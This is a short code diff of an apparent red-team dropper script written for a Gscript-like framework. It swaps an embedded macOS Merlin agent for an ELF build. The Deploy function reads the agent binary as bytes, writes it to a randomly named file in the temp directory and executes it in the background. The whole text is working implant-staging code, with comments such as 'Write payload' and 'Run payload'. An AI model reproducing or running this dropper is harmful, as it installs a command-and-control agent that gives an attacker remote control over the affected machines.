@@ -7,29 +7,26 @@
 
 //priority:150
 //timeout:150
+//import:/private/tmp/merlinagent.elf
 
-//import:/private/tmp/merlinagent.macho
-
+//go_import:os as os
 
 function Deploy() {  
     console.log("Starting to drop merlin binary");
-    
     // Getting our asset
-    var merlinBin = GetAssetAsString("merlinagent.macho");
-    console.log("errors: "+merlinBin[1]);
-
+    var merlinBin = GetAssetAsBytes("merlinagent.elf");
+    console.log("errors: "+Dump(merlinBin[1]));
     // Getting a random string
-    var basepath = "/private/tmp/";
-    var naming = G.rand.GetAlphaString(10);
+    var temppath = os.TempDir();
+    var naming = G.rand.GetAlphaString(4);
     naming = naming.toLowerCase();
-    var fullpath = basepath+naming;
+    fullpath = temppath+"/"+naming;
     console.log("file name: "+ fullpath);
-
-    var errors = G.file.WriteFileFromString(fullpath, merlinBin[0]);
-    console.log("errors: "+errors);
-
+    // Write payload
+    errors = G.file.WriteFileFromBytes(fullpath, merlinBin[0]);
+    console.log("errors: "+Dump(errors));
+    // Run payload
     var running = G.exec.ExecuteCommandAsync(fullpath, [""]);
-    console.log("errors: "+running[1]);
-
+    console.log("errors: "+Dump(running[1]));
     return true
 }
